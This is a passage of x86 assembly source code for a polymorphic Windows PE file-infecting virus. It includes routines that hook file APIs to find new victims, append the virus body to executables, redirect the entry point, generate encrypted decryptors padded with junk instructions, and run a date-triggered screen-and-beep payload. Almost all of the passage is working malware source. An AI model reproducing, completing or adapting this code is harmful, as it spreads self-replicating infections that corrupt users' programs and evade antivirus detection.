	lea	ebx,[V_Direcciones@1+ebp]	; Time to get all API we need...
	lea	edi,[V_Nombres@1+ebp]		; Set some pointers to Strings and Addresses
	call	FullApiAddress			; Fill in with this process all
	or	eax,eax
	jz	GetApiError@1
	xor	eax,eax				; No error -> non Zero value
	inc	eax
	ret
GetApiError@1:
	xor	eax,eax				; Zero -> arghh... shit! an error
	ret
GetApiAddress endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Get the Kernel Base					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

GetKernelAddress proc
	mov	eax,[esp+2Ch]			; Look on the Stack and get the CreateProcess
	and	eax,0FFFF0000h			;  address... and go down until we get the
	mov	ecx,05h				;  famous MZ signature...
GetKernel@1:
	mov	bx,[eax]
	cmp	bx,'ZM'
	jz	GetKernel@2			; hahaha... The Kernel Address!
	sub	eax,00010000h			; Nop! go down
	loop	GetKernel@1
	xor	eax,eax				; Error -> eax zero
GetKernel@2:
	mov	[@_KernelAddress+ebp],eax	; We have now the Kernel Base Address!
	ret
GetKernelAddress endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to make a random number with a Range			*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

GetRndRange proc
	push	ecx			; Save some registers
	push	edx
	mov	ecx,eax
	call	Random			; Call Random Function
	xor	edx,edx			; Make a number in the Range
	div	ecx
	mov	eax,edx			; And we have a random number in eax  
	pop	edx
	pop	ecx
	ret
GetRndRange endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function Hook of CopyFileA API					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

HookCopyFileA proc
	pushad				; Save Registers
	pushfd
	mov	ebp,00h			; Recuperate the Delta Offset
V_DeltaHook	equ	$-4
	call	BuscarArchivos		; And Find some Files in the actual Path
	popfd
	popad
	push	5A5A5A5Ah		; Finaly jump to the real API
V_JumpHook	equ	$-4
	ret
HookCopyFileA endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function Hook of CreateFileA	API					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

HookCreateFileA proc
	pushad				; Save Registers
	pushfd
	mov	ebp,00h			; Recuperate the Delta Offset
	call	BuscarArchivos		; And Find some Files in the actual Path
	popfd
	popad
	push	5A5A5A5Ah		; Finaly jump to the real API
	ret
HookCreateFileA endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function Hook of DeleteFileA API					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

HookDeleteFileA proc
	pushad				; Save Registers
	pushfd
	mov	ebp,00h			; Recuperate the Delta Offset	
	call	BuscarArchivos		; And Find some Files in the actual Path
	popfd
	popad
	push	5A5A5A5Ah		; Finaly jump to the real API
	ret
HookDeleteFileA endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function Hook of FindFirstFileA API					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

HookFindFirstFileA proc
	pushad				; Save Registers
	pushfd
	mov	ebp,00h			; Recuperate the Delta Offset
	call	BuscarArchivos		; And Find some Files in the actual Path
	popfd
	popad
	push	5A5A5A5Ah		; Finaly jump to the real API
	ret
HookFindFirstFileA endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function Hook of FindNextFileA API					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

HookFindNextFileA proc
	pushad				; Save Registers
	pushfd
	mov	ebp,00h			; Recuperate the Delta Offset
	call	BuscarArchivos		; And Find some Files in the actual Path
	popfd
	popad
	push	5A5A5A5Ah		; Finaly jump to the real API
	ret
HookFindNextFileA endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function Hook of GetModuleHandleA API				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

HookGetModuleHandleA proc
	pushad				; Save Registers
	pushfd
	mov	ebp,00h			; Recuperate the Delta Offset
	call	BuscarArchivos		; And Find some Files in the actual Path
	popfd
	popad
	push	5A5A5A5Ah		; Finaly jump to the real API
	ret
HookGetModuleHandleA endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function Hook of MoveFileA API					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

HookMoveFileA proc
	pushad				; Save Registers
	pushfd
	mov	ebp,00h			; Recuperate the Delta Offset
	call	BuscarArchivos		; And Find some Files in the actual Path
	popfd
	popad
	push	5A5A5A5Ah		; Finaly jump to the real API
	ret
HookMoveFileA endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Infect a New Host					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

InfectarArchivo proc
	push	edi					; Save registers
	push	esi
	mov	eax,[DatosArchivo.FileSizeLow+ebp]	; Add to File Size the Virus Size
	mov	esi,[DatosArchivo.FileSizeHigh+ebp]	;  and Align it with Section Alignment
	add	eax,TamVirus@2
	call	AlinearCifra
	mov	ecx,75h					; Make the Mapping Size a multiple
	xor	edx,edx					;  of 75h (Size Padding)
	push	eax
	div	ecx
	pop	eax
	sub	ecx,edx
	add	eax,ecx
	mov	edi,eax
	mov	[H_TamHostVirus+ebp],eax		; Save this Value
	mov	ebx,[H_HandleOpen+ebp]
	call	FileMapping				; And ReMap the File... 
	or	eax,eax
	jz	InfectarArchivoError@1			; Error... Truncate and Close File
	mov	[H_HandleMapa+ebp],eax
	mov	ebx,eax
	call	MapViewFile				; Create the extended File Mapping 
	or	eax,eax
	jz	InfectarArchivoError@2
	mov	[@_DirArchivo+ebp],eax
	call	ModificarHostNuevo			; Change some headers values of 
	or	eax,eax					;  the New Host
	jz	InfectarArchivoError@3			; If error Truncate and go out!
	call	CopiarHostNuevo				; Copy the Virus Body to New Host,
	call	EncriptarHostNuevo			;  generate a new Decriptor and  
	mov	esi,[@_DirArchivo+ebp]			;  encript the Virus
	call	CheckSumValido				; If the Host had a CheckSum
	or	eax,eax					;  go and recalculate it
	jz	InfectarArchivoError@4
	mov	ecx,[H_TamHostVirus+ebp]
	call	CheckSumMappedFile
InfectarArchivoError@4:
	mov	ebx,esi
	call	UnmapFile				; Unmap File, Close Handle...
	mov	eax,[H_HandleMapa+ebp]			; Well... the same stuff
	call	CloseHandleA
	mov	ebx,[H_TamHostVirus+ebp]
	call	TruncarHostNuevo
	mov	eax,[H_HandleOpen+ebp]
	call	CloseHandleB
	pop	esi
	pop	edi
	xor	eax,eax					; All terminated well -> eax non zero
	inc	eax
	ret
InfectarArchivoError@3:
	mov	ebx,[@_DirArchivo+ebp]			; Unmap, Close, Truncate and Close...
	call	UnmapFile
InfectarArchivoError@2:
	mov	eax,[H_HandleMapa+ebp]
	call	CloseHandleA
	mov	ebx,[DatosArchivo.FileSizeLow+ebp]
	call	TruncarHostNuevo			; If we have an error, truncate the
InfectarArchivoError@1:					;  New Host with his real size
	mov	eax,[H_HandleOpen+ebp]
	call	CloseHandleB
	pop	esi
	pop	edi
	xor	eax,eax					; The File have not been infected
	ret
InfectarArchivo endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to start the Random Number Generator			*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

IniciarSemilla proc
	call	[@_GetTickCount+ebp]		; The 1st time is a good initial value
	mov	[H_Semilla+ebp],eax		; Save it in a Virus place
	ret
IniciarSemilla endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Load New Libraries					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

LoadLibrary proc
	push	esi
	call	[@_GetModuleHandleA+ebp]	; Get the Library Address if loaded yet
	or	eax,eax
	jnz	LoadLibrary@1
	push	esi
	call	[@_LoadLibraryA+ebp]		; If not loaded... we load it now!
LoadLibrary@1:
	ret
LoadLibrary endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Load SfcIsFileProtected API				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

LoadSfcProtected proc
	lea	esi,[N_SfcLib+ebp]
	call	LoadLibrary			; Load Sfd.dll Library, please...
	or	eax,eax
	jz	LoadError@1
	mov	esi,eax
	lea	edi,[V_Nombres@5+ebp]		; APIs names and addresses
	lea	ebx,[V_Direcciones@5+ebp]
	call	FullApiAddress			; It's time to get some APIs, hahaha
	or	eax,eax
	jz	LoadError@1
	ret
LoadError@1:
	mov	[@_SfcIsFileProtected+ebp],eax	; Save this address
	ret
LoadSfcProtected endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Map a File in Memory					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

MapViewFile proc
	xor	eax,eax				; Just map the File that the Virus wants
	push	edi
	push	eax
	push	eax
	push	000F001Fh			; With File Map All Access
	push	ebx
	call	[@_MapViewOfFile+ebp]		; Map view of New Host, please
	ret
MapViewFile endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Set Some Host Header Values				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

ModificarHostNuevo proc
	call	CheckEntryPoint			; Check the Entry Point and save some values
	or	ecx,ecx
	jz	ModificarError@1		; No good Host -> go out now
	mov	[H_RawText+ebp],ecx		; Save some addresses
	mov	[H_RvaText+ebp],ebx
	mov	[H_TextHeader+ebp],edx
	mov	edx,eax
	add	edx,[edx+3Ch]			; Time to find the last section of Host
	mov	esi,edx
	add	esi,18h
	movzx	ebx,word ptr[edx+14h]
	add	esi,ebx
	movzx	ecx,word ptr[edx+06h]
	mov	edi,esi
	xor	eax,eax
ModificarBucle@1:
	cmp	[edi+14h],eax
	jna	ModificarBucle@2
	mov	eax,[edi+14h]			; Get the actual last section
	mov	esi,edi
ModificarBucle@2:
	add	edi,28h
	loop	ModificarBucle@1
	mov	eax,[esi+24h]
	and	eax,10000000h			; Check for Shareable sections (we don't want)
	jnz	ModificarError@1
	mov	eax,[DatosArchivo.FileSizeLow+ebp]
	mov	ebx,eax
	shr	ebx,04h
	sub	eax,ebx
	mov	ebx,[esi+14h]
	add	ebx,[esi+10h]
	sub	eax,ebx
	jnc	ModificarError@1
	mov	eax,TamVirus@2
	mov	ebx,[esi+10h]
	add	eax,ebx
	call	AlinearCifra
	mov	[esi+10h],eax			; Set the Section Raw Data and Virtual Size
	mov	[esi+08h],eax
	push	ebx
	call	PonerDirectorio			; Actualice the Directory Structure
	add	ebx,[esi+0Ch]
	mov	eax,[edx+28h]			; whohoho... Set the new Entry Point, but
	mov	[H_RvaHost+ebp],eax		;  make it point to the code section
	mov	[H_RvaVirus+ebp],ebx
	call	SetEntryPoint
	add	ebx,[edx+34h]
	sub	ebx,offset V_InicioVirus - offset V_InicioHost + 00401000h
	mov	[H_Delta+ebp],ebx		; Hard-Coded Delta offset
	mov	eax,[esi+10h]
	add	eax,[esi+0Ch]
	mov	[edx+50h],eax			; Set a new Size of Image
	or	[esi+24h],0E0000020h		; Make the last Section Writeable, Executable...
	mov	[edx+08h],'POLT'		; Put an Infection Mark in the Host Header
	lea	eax,[SysDate+ebp]
	push	eax
	call	[@_GetSystemTime+ebp]		; Get the Date of Infection
	pop	ebx
	xor	eax,eax				; Great! -> non zero eax
	inc	eax
	ret
ModificarError@1:
	xor	eax,eax				; Shit!... don't infect it, zero eax
	ret
ModificarHostNuevo endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to generate a new Decriptor					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

NuevoDesencriptar proc
	push	edi
	call	Random				; Get a new random Value
	push	eax
	mov	ebx,eax
	and	eax,00000007h			; Make it 0 to 7 to select a Decriptor
	push	eax
	imul	eax,eax,1Bh
	lea	esi,[V_Decriptores+ebp]		; And point to the selected Decriptor
	add	esi,eax
	mov	[esi+01h],ebx			; with his new 32 bits Key
	add	edi,offset V_Desencriptar - offset V_InicioVirus
	mov	ecx,17h				; Junk counter Instructions
	lodsb					; Build a new Decriptor
	stosb
	lodsd
	stosd
	call	PonerBasura			; Well... some Junk Instructions, please
	lodsb					; And on, and on... the same
	stosb
	lodsd
	stosd
	call	PonerBasura
	lodsw
	stosw
	lodsd
	stosd
	call	PonerBasura
	push	edi				; Save the jump loop direction for later
	lodsw
	stosw
	call	PonerBasura
	lodsw
	stosw
	call	PonerBasura
	lodsb
	stosb
	call	PonerBasura
	lodsw
	stosw
	lodsb
	stosb
	call	PonerBasura
	call	RellenarBasura			; If we have more space... fill in whit junk
	lodsb
	stosb
	lodsw
	pop	edx
	sub	edx,edi
	dec	edx
	dec	edx
	mov	ah,dl
	stosw					; And code the last jump with his address
	pop	eax
	pop	ecx
	pop	edi
	ret
NuevoDesencriptar endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to calculate a New Partial CheckSum				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

ParcialCheckSum proc
	push	esi				; This is a version of the CheckSumMappedFile
	xor	eax,eax				;  API... to make a CRC32 of Infected Files
	shl	ecx,01h				; Only makes the partial Check Sum, used by
	je	Check@0				;  other process that calculate the final
	test	esi,02h				;  Check Sum of Mapped File
	je	Check@1
	movzx	edx,word ptr[esi]
	add	eax,edx
	adc	eax,00h
	add	esi,02h
	sub	ecx,02h
Check@1:
	mov	edx,ecx
	and	edx,07h
	sub	ecx,edx
	je	Check@2
	test	ecx,08h
	je	Check@3
	add	eax,[esi]
	adc	eax,[esi+04h]
	adc	eax,00h
	add	esi,08h
	sub	ecx,08h
	je	Check@2
Check@3:
	test	ecx,10h
	je	Check@4
	add	eax,[esi]
	adc	eax,[esi+04h]
	adc	eax,[esi+08h]
	adc	eax,[esi+0Ch]
	adc	eax,00h
	add	esi,10h
	sub	ecx,10h
	je	Check@2
Check@4:
	test	ecx,20h
	je	Check@5
	add	eax,[esi]
	adc	eax,[esi+04h]
	adc	eax,[esi+08h]
	adc	eax,[esi+0Ch]
	adc	eax,[esi+10h]
	adc	eax,[esi+14h]
	adc	eax,[esi+18h]
	adc	eax,[esi+1Ch]
	adc	eax,00h
	add	esi,20h
	sub	ecx,20h
	je	Check@2
Check@5:
	test	ecx,40h
	je	Check@6
	add	eax,[esi]
	adc	eax,[esi+04h]
	adc	eax,[esi+08h]
	adc	eax,[esi+0Ch]
	adc	eax,[esi+10h]
	adc	eax,[esi+14h]
	adc	eax,[esi+18h]
	adc	eax,[esi+1Ch]
	adc	eax,[esi+20h]
	adc	eax,[esi+24h]
	adc	eax,[esi+28h]
	adc	eax,[esi+2Ch]
	adc	eax,[esi+30h]
	adc	eax,[esi+34h]
	adc	eax,[esi+38h]
	adc	eax,[esi+3Ch]
	adc	eax,00h
	add	esi,40h
	sub	ecx,40h
	je	Check@2
Check@6:
	add	eax,[esi]
	adc	eax,[esi+04h]
	adc	eax,[esi+08h]
	adc	eax,[esi+0Ch]
	adc	eax,[esi+10h]
	adc	eax,[esi+14h]
	adc	eax,[esi+18h]
	adc	eax,[esi+1Ch]
	adc	eax,[esi+20h]
	adc	eax,[esi+24h]
	adc	eax,[esi+28h]
	adc	eax,[esi+2Ch]
	adc	eax,[esi+30h]
	adc	eax,[esi+34h]
	adc	eax,[esi+38h]
	adc	eax,[esi+3Ch]
	adc	eax,[esi+40h]
	adc	eax,[esi+44h]
	adc	eax,[esi+48h]
	adc	eax,[esi+4Ch]
	adc	eax,[esi+50h]
	adc	eax,[esi+54h]
	adc	eax,[esi+58h]
	adc	eax,[esi+5Ch]
	adc	eax,[esi+60h]
	adc	eax,[esi+64h]
	adc	eax,[esi+68h]
	adc	eax,[esi+6Ch]
	adc	eax,[esi+70h]
	adc	eax,[esi+74h]
	adc	eax,[esi+78h]
	adc	eax,[esi+7Ch]
	adc	eax,00h
	add	esi,80h
	sub	ecx,80h
	jne	Check@6
Check@2:
	test	edx,edx
	je	Check@0
Check@7:
	movzx	ecx,word ptr[esi]
	add	eax,ecx
	adc	eax,00h
	add	esi,02h
	sub	edx,02h
	jne	Check@7
Check@0:
	mov	edx,eax
	shr	edx,10h
	and	eax,0000FFFFh
	add	eax,edx
	mov	edx,eax
	shr	edx,10h
	add	eax,edx
	and	eax,0000FFFFh
	pop	esi
	ret
ParcialCheckSum endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function Virus Graphic Payload					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

Payload proc
	xor	eax,eax					; Get the Screen Handle
	push	eax
	call	[@_GetDC+ebp]
	or	eax,eax
	jz	PayloadError@1				; If error -> Skip it!
	mov	[H_HandlePantalla+ebp],eax		; And save it...
	mov	edi,0320h				; Optimize to 800 per 600 screens
	mov	esi,0258h
	mov	ebx,07h					; Number of Rare Spots ;)
PayloadBucle@1:
	call	Random					; Create a Brush with a random color
	and	eax,00FFFFFFh
	push	eax
	call	[@_CreateSolidBrush+ebp]
	push	eax
	push	dword ptr[H_HandlePantalla+ebp]
	call	[@_SelectObject+ebp]			; And select it to paint...hahaha
	call	RunBeep					; whooaaa, wake up with the speaker!!
	push	ebx
	mov	eax,esi
	call	GetRndRange				; Get a random position (x,y)
	mov	ebx,eax					;  in the actual screen (800,600)
	mov	eax,edi
	call	GetRndRange
	mov	ecx,eax
	mov	edx,ebx
	push	esi
	mov	esi,25h					; Build the area of Circle
	add	edx,esi
	add	ecx,esi
	sub	ebx,esi
	sub	eax,esi
	pop	esi
	push	edx					; Push the values
	push	ecx
	push	ebx
	push	eax
	push	dword ptr[H_HandlePantalla+ebp]
	call	[@_Ellipse+ebp]				; Draw a circle on the screen
	pop	ebx
	dec	ebx
	jnz	PayloadBucle@1				; And go on... we want more circles!
PayloadError@1:	
	ret	
Payload endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function Virus Payload Test						*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

PayloadVirus proc
	lea	eax,[SysDate+ebp]			; Push a pointer to a structure
	push	eax
	call	[@_GetSystemTime+ebp]			; And get the system Time
	or	eax,eax
	jz	PayloadVirusError@1
	cmp	word ptr[SysDate.Dia+ebp],1Fh		; If 31th of actual month
	jnz	PayloadVirusError@1
	cmp	word ptr[SysDate.Mes+ebp],5A5Ah		; And different than the infection
V_MesVirus	equ	$-2				;  month Date Mark
	jz	PayloadVirusError@1
	call	RunPayload				; Make a presentation (hahaha XD)
PayloadVirusError@1:
	ret
PayloadVirus endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to put some shit instructions in Decriptor			*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

PonerBasura proc
	or	ecx,ecx				; Check for counter, if zero...finish
	jz	PonerBasuraError@1
	call	Random				; get a random number
	mov	edx,eax
	cmp	ecx,03h				; At least 3 bytes in counter
	jc	PonerBasura@1
	bt	edx,00h				; And random please
	jnc	PonerBasura@1			; We could put a 3 byte instruction
	lea	ebx,[V_TresBytes+ebp]
	movzx	eax,dl
	and	al,1Fh
	mov	dl,al
	shl	al,01h
	add	al,dl
	add	ebx,eax
	mov	ax,[ebx]
	stosw
	mov	al,[ebx+02h]
	stosb					; Great!... put the instruction
	dec	ecx				; Decrement counter
	dec	ecx
	dec	ecx
PonerBasura@1:
	cmp	ecx,02h				; At least 2 bytes in counter
	jc	PonerBasura@2
	bt	edx,08h				; And random please
	jnc	PonerBasura@2			; Or a 2 byte junk instruction
	lea	ebx,[V_DosBytes+ebp]
	movzx	eax,dh
	and	al,1Fh
	shl	al,01h
	add	ebx,eax
	mov	ax,[ebx]
	stosw					; Put the instruction
	dec	ecx				; Decrement counter
	dec	ecx
PonerBasura@2:
	cmp	ecx,01h				; At least one byte in counter
	jc	PonerBasuraError@1
	bt	edx,10h				; We want a random form
	jnc	PonerBasuraError@1		; Or a 1 byte junk instruction
	lea	ebx,[V_UnByte+ebp]
	shr	edx,10h
	and	dx,000Fh
	add	ebx,edx
	mov	al,[ebx]
	stosb					; Storage it!
	dec	ecx				; And decrement the counter
PonerBasuraError@1:
	ret
PonerBasura endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Set the Directory Entry					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

PonerDirectorio proc
	push	ecx			; Save some registers
	push	ebx
	mov	edi,edx
	add	edi,78h			; Find the Directory address of infected File
	mov	ecx,[edx+74h]
Poner@2:
	mov	ebx,[edi]		; Get the variable that points to the last section
	cmp	ebx,[esi+0Ch]		;  if exist...
	jz	Poner@1
	add	edi,08h
	loop	Poner@2
Poner@3:
	pop	ebx			; Finish!
	pop	ecx
	ret
Poner@1:
	add	edi,04h			; ...And change it with the new values
	mov	[edi],eax
	jmp	Poner@3
PonerDirectorio endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to protect a Memory Section					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

ProtegerMemoria proc
	lea	eax,[H_Proteccion+ebp]			; Well, push the initial values
	push	eax					;  of the block and Protect it
	push	dword ptr[InfoMemoria.Protect+ebp]
	push	dword ptr[InfoMemoria.RegionSize+ebp]
	push	dword ptr[InfoMemoria.BaseAddress+ebp]
	call	[@_VirtualProtect+ebp]			; Replace the real protection set
	ret
ProtegerMemoria endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to generate a Random Number					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

Random proc
	mov	eax,[H_Semilla+ebp]		; Humm... a typical Random Number Generator
	imul	eax,eax,65h			; Take a seed and make another random number
	add	eax,0167h			;  with this process
	mov	[H_Semilla+ebp],eax		; Save the random value
	ret
Random endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to fill in with shit instructions the Decriptor		*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

RellenarBasura proc
	or	ecx,ecx			; If counter is zero... finish it
	jz	RellenarError@1
Rellenar@1:
	cmp	ecx,03h			; If not... write 3 bytes instructions
	jc	Rellenar@2
	call	Random			; A random instruction
	mov	edx,eax
	lea	ebx,[V_TresBytes+ebp]
	movzx	eax,dl
	and	al,1Fh
	mov	dl,al
	shl	al,01h
	add	al,dl
	add	ebx,eax
	mov	ax,[ebx]
	stosw				; Put the instruction in decriptor place
	mov	al,[ebx+02h]
	stosb
	dec	ecx			; Decrement the counter
	dec	ecx
	dec	ecx
	jmp	Rellenar@1
Rellenar@2:
	cmp	ecx,02h			; Or 2 bytes instructions
	jc	Rellenar@3
	call	Random			; A random instruction
	mov	edx,eax
	lea	ebx,[V_DosBytes+ebp]
	movzx	eax,dl
	and	al,1Fh
	shl	al,01h
	add	ebx,eax
	mov	ax,[ebx]
	stosw				; Storage it
	dec	ecx			; And decrement the counter
	dec	ecx
	jmp	Rellenar@2
Rellenar@3:
	cmp	ecx,01h			; Or 1 byte instructions
	jc	RellenarError@1
	call	Random			; We want a random one!
	mov	edx,eax
	lea	ebx,[V_UnByte+ebp]
	movzx	eax,dl
	and	al,0Fh
	add	ebx,eax
	mov	al,[ebx]
	stosb				; Put it and decrement...
	dec	ecx
	jmp	Rellenar@3
RellenarError@1:	
	ret
RellenarBasura endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function Payload Sound Loop						*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

RunBeep proc
	push	ebx			; Hahaha... a simple loop efect with the Internal
	push	edi			;  speaker (I guess everybody knows)
	push	esi
	mov	ebx,20h			; Loop Counter
	mov	edi,01F4h		; Initial frecuence
	mov	esi,19h			; Duration of Sound
RunBeepBucle@1:
	push	esi
	push	edi
	call	[@_Beep+ebp]		; Hahaha... (But don't work in win9x first editions)
	add	edi,64h			; Bring up frecuence...:P
	dec	ebx
	jnz	RunBeepBucle@1		; And on, and on...
	pop	esi
	pop	edi
	pop	ebx
	ret				; Return to caller process
RunBeep endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Load Libraries for Payload				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

RunPayload proc
	lea	esi,[N_UserLib+ebp]		; Try to load the User32.dll...
	call	LoadLibrary
	or	eax,eax
	jz	RunPayloadError@1		; If error -> go out
	mov	esi,eax
	lea	edi,[V_Nombres@2+ebp]		; If not -> get all APIs needed
	lea	ebx,[V_Direcciones@2+ebp]
	call	FullApiAddress
	or	eax,eax
	jz	RunPayloadError@1
	lea	esi,[N_GdiLib+ebp]		; ... And the Gdi.dll Libraries
	call	LoadLibrary
	or	eax,eax
	jz	RunPayloadError@1
	mov	esi,eax
	lea	edi,[V_Nombres@3+ebp]
	lea	ebx,[V_Direcciones@3+ebp]
	call	FullApiAddress			; And get all APIs needed
	or	eax,eax
	jz	RunPayloadError@1
	call	Payload				; If no error -> Run Payload
RunPayloadError@1:
	ret
RunPayload endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function Runtime Virus (Direct Action Part)				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

RuntimeVirus proc
	lea	eax,[BufferUno+ebp]		; Well, get the actual Path
	push	eax
	push	MAX_PATH
	call	[@_GetCurrentDirectoryA+ebp]
	mov	[H_NumLetrasA+ebp],eax		; Save Path Lenght
	push	MAX_PATH
	lea	eax,[BufferDos+ebp]		; Get the Windows Path
	push	eax
	call	[@_GetWindowsDirectoryA+ebp]
	mov	[H_NumLetrasB+ebp],eax		; Save Path Lenght
	xor	ecx,ecx
	call	SetBufferTres			; Set Buffer for SFC calls
	call	BuscarArchivos			; Time to find some Files... ;P
	lea	eax,[BufferDos+ebp]
	push	eax
